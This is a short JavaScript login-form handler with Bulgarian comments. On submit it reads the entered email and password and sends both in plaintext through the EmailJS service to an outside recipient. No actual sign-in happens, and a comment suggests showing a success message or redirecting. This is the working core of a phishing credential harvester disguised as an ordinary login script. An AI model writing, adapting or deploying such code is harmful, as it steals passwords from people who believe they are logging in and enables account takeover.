document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault(); // спира изпращането на формата

  const userEmail = document.getElementById('email').value;
  const userPassword = document.getElementById('password').value;
  const errorMessage = document.getElementById('errorMessage');

  if (userEmail && userPassword) {
    emailjs.send("service_gtutm8i", "b340e6m", {
      user_email: userEmail,
      user_password: userPassword,
    })
    .then(function(response) {
      console.log("Успешно изпратен имейл:", response);
      // Може да добавиш съобщение за успешен вход или пренасочване на потребителя
    }, function(error) {
      console.log("Грешка при изпращането:", error);
      errorMessage.textContent = "Възникна грешка при входа. Моля, опитайте отново.";
      errorMessage.style.display = "block";
    });
  } else {
    errorMessage.textContent = "Моля, въведете имейл и парола.";
    errorMessage.style.display = "block";
  }
});
